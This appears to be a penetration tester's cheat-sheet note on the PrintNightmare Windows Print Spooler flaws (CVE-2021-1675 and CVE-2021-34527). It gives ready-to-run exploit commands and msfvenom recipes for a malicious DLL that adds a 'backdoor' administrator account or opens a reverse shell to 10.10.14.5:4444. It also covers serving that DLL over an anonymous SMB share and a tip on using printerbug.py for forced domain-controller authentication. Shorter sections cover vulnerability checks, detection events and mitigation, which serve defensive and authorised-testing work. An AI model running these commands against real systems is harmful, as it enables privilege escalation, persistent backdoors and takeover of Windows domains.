---
tags: [pentest, printnightmare, cve-2021-34527, ad, active-directory, initial-access, windows]
phase: 5
---
# PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

Print Spooler service allows loading arbitrary DLLs as SYSTEM via `RpcAddPrinterDriverEx`. Works locally and remotely.

[[06 - Gaining Access/00 - README|Folder index]]

## Variants

- **CVE-2021-1675** - local privesc (printer driver install).
- **CVE-2021-34527** - remote (Point and Print).

## Exploit (remote)

```bash
# Need any valid domain user
impacket-PrintNightmare corp.local/user:pass@<target>.corp.local '\\10.10.14.5\share\evil.dll'

# Or run from Windows
SharpPrintNightmare.exe -dll \\10.10.14.5\share\evil.dll
```

## Generate the DLL payload

```bash
msfvenom -p windows/x64/exec CMD="net user backdoor P@ss123 /add && net localgroup administrators backdoor /add" -f dll -o evil.dll

# Or reverse shell DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o evil.dll
```

## Host the DLL via SMB

```bash
impacket-smbserver share . -smb2support -username '' -password ''
# Anonymous read share at \\10.10.14.5\share\
```

## Check if vulnerable

```bash
# Without exploiting
nmap --script smb-vuln-cve-2021-34527 -p445 <target>

# Or:
nxc smb <target> -u user -p pass -M printnightmare
```

## Patch status check (PowerShell on target)

```powershell
Get-HotFix | Where-Object {$_.HotFixID -in 'KB5004945','KB5005010','KB5005033'}
# Also check the registry mitigations:
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" /v RestrictDriverInstallationToAdministrators
```

## Local privesc variant (CVE-2021-1675)

```cmd
.\Invoke-Nightmare.ps1
.\Invoke-Nightmare.ps1 -DriverName "Generic / Text Only" -NewUser "pwn" -NewPassword "P@ss"
```

## Detection

- Event ID **316** Print Service Operational log - driver install events.
- Sysmon DLL load events from `spoolsv.exe` loading unsigned / network-path DLLs.
- Audit "Microsoft-Windows-PrintService/Admin".

## Mitigation (if unpatched)

```cmd
sc stop spooler
sc config spooler start=disabled
:: Or via GPO: Disable "Allow Print Spooler to accept client connections"
```

> [!tip] PrintNightmare is also a coercion vector
> Even when patched against RCE, the printer bug (`MS-RPRN`) is often still callable for [[22 - Coercion (PetitPotam Coercer)|coercion]]. Try `printerbug.py` to force DC auth even on patched systems.
